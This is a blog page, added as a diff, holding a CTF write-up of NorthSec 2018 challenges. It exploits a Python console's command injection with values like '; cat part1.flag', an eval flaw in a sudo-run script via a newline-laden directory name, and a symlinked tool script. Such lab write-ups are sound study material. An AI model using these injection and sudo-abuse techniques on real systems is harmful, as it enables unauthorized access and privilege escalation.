@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+
+    <!-- Non social metatags -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="theme-color" content="#157878">
+
+    
+
+    <title>Nsec 2018</title>
+
+    
+      <!-- Update your html tag to include the itemscope and itemtype attributes. -->
+<html itemscope itemtype="http://schema.org/Article">
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- Place this data between the <head> tags of your website -->
+
+  <meta name="author" content="Srb_">
+
+<meta name="description" content="Connexion Configuration" />
+
+
+
+
+  <meta name="keywords" itemprop="category" content="">
+
+
+<!-- Schema.org markup for Google+ -->
+<meta itemprop="name" content="Nsec 2018">
+<meta itemprop="description" content="Connexion Configuration">
+
+  <meta itemprop="image" content="http://localhost:4000/">
+
+
+<!-- Twitter Card data -->
+<meta name="twitter:card" content="summary_large_image">
+
+
+
+<meta name="twitter:title" content="Nsec 2018">
+<meta name="twitter:description" content="Connexion Configuration">
+
+
+  <meta name="twitter:creator" content="@srb01246810">
+
+
+<!-- Twitter summary card with large image must be at least 280x150px -->
+
+  <meta name="twitter:image:src" content="http://localhost:4000/">
+  <meta property="twitter:image" content="http://localhost:4000/">
+
+<meta property="twitter:url" content="http://localhost:4000//offsec/2018/08/05/Nsec-2018.html">
+
+<!-- Open Graph data -->
+<meta property="og:title" content="Nsec 2018" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:4000//offsec/2018/08/05/Nsec-2018.html" />
+
+  <meta property="og:image" content="http://localhost:4000/" />
+
+<meta property="og:description" content="Connexion Configuration" />
+<meta property="og:site_name" content="Home" />
+
+  <meta property="article:published_time" content="2018-08-05T00:00:00-04:00" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <meta property="article:tag" content="offsec">
+  
+
+
+
+  <meta property="article:tag" content="">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:4000/offsec/2018/08/05/Nsec-2018.html">
+
+    
+
+    <link rel="shortcut icon" href="http://localhost:4000/favicon.ico">
+    <meta name="robots" content="noarchive">
+
+    <!-- <link rel="alternate" media="only screen and (max-width: 640px)" href="">
+    <link rel="alternate" media="handheld" href=""> -->
+
+
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+  </head>
+  <body>
+
+    <header class="site-header" role="banner">
+
+  <div class="wrapper">
+    
+    
+
+    
+      <a class="site-title" href="/">Home</a>
+    
+
+    
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+              <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+              <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger">
+          
+            
+            
+              
+              
+            
+          
+            
+            
+              
+                <a class="page-link" href="/dev.html">Dev</a>
+              
+            
+          
+            
+            
+          
+            
+            
+              
+                <a class="page-link" href="/offSec.html">OffSec</a>
+              
+            
+          
+            
+            
+          
+        </div>
+      </nav>
+    
+  </div>
+</header>
+
+    
+    
+    
+
+    
+    <div style="padding-top: 10%; text-align: center">
+      <h1 class="project-name">Nsec 2018</h1>
+      <h2 class="project-tagline"></h2>
+    </div>
+    
+
+    <section class="main-content">
+
+      <div>
+
+  <h1 id="connexion-configuration">Connexion Configuration</h1>
+
+<p>Ok, that one was pretty straight foward. The message arrived later during the CTF. It  was saying that ours connexion configuration had a problem. The only thing we had to do was to look in our <code class="highlighter-rouge">connexion configuration</code>? lol :)</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim /etc/resolv.conf
+</code></pre></div></div>
+
+<h1 id="rebel-base-repair-httpxnfn8h3kbctf">Rebel Base Repair: http://xn–fn8h3kb.ctf/</h1>
+
+<p><em>index.html</em></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Service status
+Service Name 	Status
+
+camera-service 	DOWN
+clock-service 	DOWN
+management-service 	DOWN
+status-service 	DOWN
+tool-service 	DOWN
+remote-service 	DOWN
+
+Management credentials
+
+User : tech
+Password : fixmeplease
+</code></pre></div></div>
+<h2 id="scannings">Scannings</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># dirs</span>
+_tachyon http://xn--fn8h3kb.ctf/
+<span class="o">[</span>21:36:23] <span class="o">[</span>FOUND] <span class="k">*</span>Forbidden<span class="k">*</span> Icon directory at: http://xn--fn8h3kb.ctf/icons/
+
+<span class="c">#ip</span>
+nmap <span class="nt">-6</span> xn--fn8h3kb.ctf
+
+Starting Nmap 7.01 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2018-05-18 21:51 EDT
+Nmap scan report <span class="k">for </span>xn--fn8h3kb.ctf <span class="o">(</span>9000:470:b2b5:cafe:216:3eff:fe50:a269<span class="o">)</span>
+Host is up <span class="o">(</span>0.0023s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>0.11 seconds
+</code></pre></div></div>
+
+<h2 id="gaining-access">Gaining Access:</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+
+    <span class="o">(</span>status-service<span class="o">)</span> NOPASSWD: /opt/services/status-service/check-status.sh
+        <span class="o">(</span>tool-service<span class="o">)</span> NOPASSWD: /opt/tool-service/
+</code></pre></div></div>
+<h4 id="management-service"><strong>Management-Service</strong></h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim /opt/services/management-service/manage.py
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#manage.py: /opt/services/management-service/manage.py</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">httplib</span>
+
+<span class="k">def</span> <span class="nf">print_menu</span><span class="p">():</span>
+        <span class="k">print</span> <span class="s">"######################"</span>
+        <span class="k">print</span> <span class="s">"# Management console #"</span>
+        <span class="k">print</span> <span class="s">"######################"</span>
+        <span class="k">print</span> <span class="s">""</span>
+        <span class="k">print</span> <span class="s">"Type '?' or 'help' for help."</span>
+
+<span class="k">def</span> <span class="nf">get_option</span><span class="p">():</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
+        <span class="n">invalue</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">invalue</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">menu_loop</span><span class="p">():</span>
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+                <span class="n">print_menu</span><span class="p">()</span>
+                <span class="n">opt</span> <span class="o">=</span> <span class="n">get_option</span><span class="p">()</span>
+
+                <span class="k">if</span> <span class="ow">not</span> <span class="n">opt</span> <span class="ow">in</span> <span class="n">MENU_OPTIONS</span><span class="p">:</span>
+                        <span class="k">print</span> <span class="s">"Invalid option"</span>
+                        <span class="k">continue</span>
+
+                <span class="n">MENU_OPTIONS</span><span class="p">[</span><span class="n">opt</span><span class="p">]()</span>
+
+<span class="k">def</span> <span class="nf">change_master</span><span class="p">():</span>
+        <span class="k">print</span> <span class="s">"Enter the new master password : "</span>
+        <span class="n">password</span> <span class="o">=</span> <span class="n">get_option</span><span class="p">()</span>
+
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">:</span>
+                <span class="k">print</span> <span class="s">"Password must be at most 20 characters"</span>
+                <span class="k">return</span>
+
+        <span class="c"># Prevents command injection</span>
+        <span class="n">password</span> <span class="o">=</span> <span class="n">password</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"'"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'fakechroot -s fakeroot /usr/sbin/chroot /opt/services/management-service/ /bin/bash -c </span><span class="se">\'</span><span class="s">/bin/echo "'</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="s">'" &gt; /master.txt</span><span class="se">\'</span><span class="s">'</span><span class="p">)</span>
+        <span class="k">print</span> <span class="s">"Password changed !"</span>
+
+<span class="k">def</span> <span class="nf">ping_website</span><span class="p">():</span>
+        <span class="k">print</span> <span class="s">"Enter the domain to test : "</span>
+        <span class="n">domain</span> <span class="o">=</span> <span class="n">get_option</span><span class="p">()</span>
+
+        <span class="k">try</span><span class="p">:</span>
+                <span class="n">conn</span> <span class="o">=</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
+                <span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s">"GET"</span><span class="p">,</span> <span class="s">"/"</span><span class="p">)</span>
+                <span class="n">conn</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+                <span class="k">print</span> <span class="s">"Website is UP !"</span>
+        <span class="k">except</span> <span class="nb">Exception</span><span class="p">:</span>
+                <span class="k">print</span> <span class="s">"Website is DOWN !"</span>
+
+<span class="k">def</span> <span class="nf">help_menu</span><span class="p">():</span>
+        <span class="k">print</span> <span class="s">"Options : "</span>
+        <span class="k">print</span> <span class="s">" help          : Show the help menu"</span>
+        <span class="k">print</span> <span class="s">" change-master : Change the master password of the management console"</span>
+        <span class="k">print</span> <span class="s">" ping-website  : Test website connectivity"</span>
+        <span class="k">print</span> <span class="s">" exit          : Exit the console"</span>
+
+<span class="n">MENU_OPTIONS</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s">"help"</span> <span class="p">:</span> <span class="n">help_menu</span><span class="p">,</span>
+        <span class="s">"?"</span> <span class="p">:</span> <span class="n">help_menu</span><span class="p">,</span>
+        <span class="s">"exit"</span> <span class="p">:</span> <span class="nb">exit</span><span class="p">,</span>
+        <span class="s">"change-master"</span> <span class="p">:</span> <span class="n">change_master</span><span class="p">,</span>
+        <span class="s">"ping-website"</span> <span class="p">:</span> <span class="n">ping_website</span>
+<span class="p">}</span>
+
+<span class="n">menu_loop</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Great! Here’s a concatenation that we can exploit easily! It comes from the <code class="highlighter-rouge">function change_master</code>.</p>
+
+<p><code class="highlighter-rouge">
+os.system('fakechroot -s fakeroot /usr/sbin/chroot /opt/services/management-service/ /bin/bash -c \'/bin/echo "' + password + '" &gt; /master.txt\'')</code><code class="highlighter-rouge">
+</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nv">$URL</span> 8787
+
+<span class="c">######################</span>
+<span class="c"># Management console #</span>
+<span class="c">######################</span>
+
+Type <span class="s1">'?'</span> or <span class="s1">'help'</span> <span class="k">for </span>help.
+<span class="o">&gt;</span> change-master
+Enter the new master password : 
+<span class="o">&gt;</span> <span class="s2">"; ls * "</span>
+
+<span class="c">######################</span>
+<span class="c"># Management console #</span>
+<span class="c">######################</span>
+
+Type <span class="s1">'?'</span> or <span class="s1">'help'</span> <span class="k">for </span>help.
+<span class="o">&gt;</span> change-master
+Enter the new master password : 
+<span class="o">&gt;</span> <span class="s2">"; cat part1.flag "</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /opt/services/management-service/master.txt<span class="p">;</span> 
+FLAG-3788fe305304d7eabf7e92e68e7ca430 <span class="c">#thanks @Robin ;)</span>
+</code></pre></div></div>
+
+<p>We have the part1.flag.</p>
+
+<p>Finaly, discovered that the part2.flag was NOT related to the second x-function of that service! The idea is that the <code class="highlighter-rouge">change_master() function</code> is using a <code class="highlighter-rouge">fakechroot</code>. Wich mean that it runs its own lib.c, BUT is still relative to the <code class="highlighter-rouge">tech's filesystem</code></p>
+
+<h4 id="status-service">status-service</h4>
+
+<p><code class="highlighter-rouge">cat /opt/services/status-service/check-status.sh</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Usage check-status.sh [program-id]"</span>
+        <span class="nb">exit
+</span><span class="k">fi
+
+if</span> <span class="o">[</span> <span class="nt">-z</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Program ID must not be empty"</span>
+        <span class="nb">exit
+</span><span class="k">fi
+
+
+if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-d</span> <span class="s2">"</span><span class="nv">$path</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Program ID is invalid"</span>
+        <span class="nb">exit
+</span><span class="k">fi
+
+</span><span class="nv">status</span><span class="o">=</span><span class="k">$(</span><span class="nb">eval</span> <span class="s2">"cat /opt/status/</span><span class="nv">$1</span><span class="s2">.txt"</span><span class="k">)</span>
+
+<span class="k">if</span> <span class="o">[[</span> <span class="nv">$status</span> <span class="o">==</span> <span class="k">*</span><span class="s2">"DOWN"</span><span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Service is DOWN"</span>
+        <span class="nb">exit
+</span><span class="k">fi
+
+if</span> <span class="o">[[</span> <span class="nv">$status</span> <span class="o">==</span> <span class="k">*</span><span class="s2">"UP"</span><span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Service is UP"</span>
+        <span class="nb">exit
+</span><span class="k">fi
+
+</span><span class="nb">echo</span> <span class="s2">"Unknown service status"</span>
+
+</code></pre></div></div>
+
+<p>Ok so the <code class="highlighter-rouge">var status</code> is what <code class="highlighter-rouge">eval</code> returns. Basically, <code class="highlighter-rouge">eval</code> simply runs every lines as different commands. So let’s exploit this! ;)</p>
+
+<p><code class="highlighter-rouge">status=$(eval "cat /opt/status/$1.txt")</code></p>
+<h6 id="note">Note:</h6>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">eval</span> <span class="s1">'echo woot1
+&gt; echo woot2'</span>
+woot1
+woot2
+
+<span class="c"># what we need's ish...</span>
+<span class="nb">eval</span> <span class="s2">"cat /opt/status/a_valid_dir
+&gt; run_cmd &gt; out
+&gt; '
+</span></code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /tmp/
+<span class="nb">mkdir</span> <span class="s1">'A
+ bash launch.sh &gt; out
+'</span>
+</code></pre></div></div>
+<p><strong>exploit.sh</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="c">#Pass the command in argument...</span>
+<span class="nb">echo</span> <span class="nv">$1</span> <span class="o">&gt;</span> launch.sh
+<span class="nb">sudo</span> <span class="nt">-u</span> status-service /opt/services/status-service/check-status.sh <span class="s1">'../../tmp/A
+bash launch.sh &gt; out
+cat out
+</span></code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash exploit.sh <span class="s1">'cat /flags/status-service'</span>
+FLAG-fa2b89295c01b89572bdce2bb5ada189 <span class="c">#thanks @Ced ! :)</span>
+</code></pre></div></div>
+
+<h4 id="tool-service">tool-service</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /opt/tool-service/tool
+
+<span class="c">#!/bin/bash</span>
+python /home/tech/tools/tool.py
+
+
+<span class="nb">cat</span> /home/tech/tools/tool.py
+
+<span class="c">#!/bin/python</span>
+from subprocess import call
+
+<span class="k">while </span>True:
+  print <span class="s2">"--------"</span>
+  print <span class="s2">"Menu"</span>
+  print <span class="s2">"--------"</span>
+  print <span class="s2">"1) Show hostname"</span>
+  print <span class="s2">"2) View open port"</span>
+  print <span class="s2">"3) Exit"</span>
+
+  choice <span class="o">=</span> raw_input<span class="o">(</span><span class="s2">"&gt; "</span><span class="o">)</span>
+
+  <span class="k">if</span> <span class="s2">"1"</span> <span class="k">in </span>choice:
+    call<span class="o">([</span><span class="s2">"hostname"</span><span class="o">])</span>
+  <span class="k">elif</span> <span class="s2">"2"</span> <span class="k">in </span>choice:
+    call<span class="o">([</span><span class="s2">"netstat"</span>, <span class="s2">"-ntpl"</span><span class="o">])</span>
+  <span class="k">else</span>:
+    <span class="nb">break</span>
+</code></pre></div></div>
+
+<p>Ok, there was a lot things in that script! All we had to do was to keep it simple baby!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-l</span> /opt/services/tool-service/tool
+tool -&gt; /home/tech/tools/tool.py
+<span class="nb">mv</span> ~/tools ~/tools_<span class="p">;</span> <span class="nb">mkdir</span> ~/tools
+vim ~/tools/tool.py
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python</span>
+
+<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
+
+<span class="n">call</span><span class="p">[</span><span class="s">"cat"</span><span class="p">,</span> <span class="s">"/flags/tool-service"</span><span class="p">]</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> tool-service /opt/tool-service/tool
+FLAG-54732c6b417bab535cd2d0086fd72f97 <span class="c">#thanks @srb_ ! :)</span>
+</code></pre></div></div>
+
+
+  <h2>Latest Posts</h2>
+
+  <ul class="post-list">
+    
+      - <a href="/offsec/2018/09/24/HTB-nibbles.html"> Htb Nibbles</a>
+      <br>
+    
+      - <a href="/offsec/2018/09/24/HTB-celestial.html"> Htb Celestial</a>
+      <br>
+    
+      - <a href="/offsec/2018/08/05/Nsec-2018.html"> Nsec 2018</a>
+      <br>
+    
+      - <a href="/offsec/2018/06/25/HTB-valentine.html"> Htb Valentine</a>
+      <br>
+    
+  </ul>
+
+</div>
+
+
+      <footer class="site-footer">
+        <!-- SVG icons from https://iconmonstr.com -->
+
+        <!-- Github icon -->
+        <span class="my-span-icon">
+          <a href="" aria-label="'s GitHub" title="'s GitHub">
+            <svg class="my-svg-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
+          </a>
+        </span>
+
+        <!-- Twitter icon -->
+        <span class="my-span-icon">
+          <a href="https://twitter.com/srb01246810" aria-label="'s Twitter" title="'s Twitter">
+            <svg class="my-svg-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm6.066 9.645c.183 4.04-2.83 8.544-8.164 8.544-1.622 0-3.131-.476-4.402-1.291 1.524.18 3.045-.244 4.252-1.189-1.256-.023-2.317-.854-2.684-1.995.451.086.895.061 1.298-.049-1.381-.278-2.335-1.522-2.304-2.853.388.215.83.344 1.301.359-1.279-.855-1.641-2.544-.889-3.835 1.416 1.738 3.533 2.881 5.92 3.001-.419-1.796.944-3.527 2.799-3.527.825 0 1.572.349 2.096.907.654-.128 1.27-.368 1.824-.697-.215.671-.67 1.233-1.263 1.589.581-.07 1.135-.224 1.649-.453-.384.578-.87 1.084-1.433 1.489z"/></svg>
+          </a>
+        </span>
+
+        <!-- RSS icon -->
+        
+        <!-- Contact icon -->
+        
+        
+
+      </footer>
+    </section>
+
+    
+  </body>
+</html>
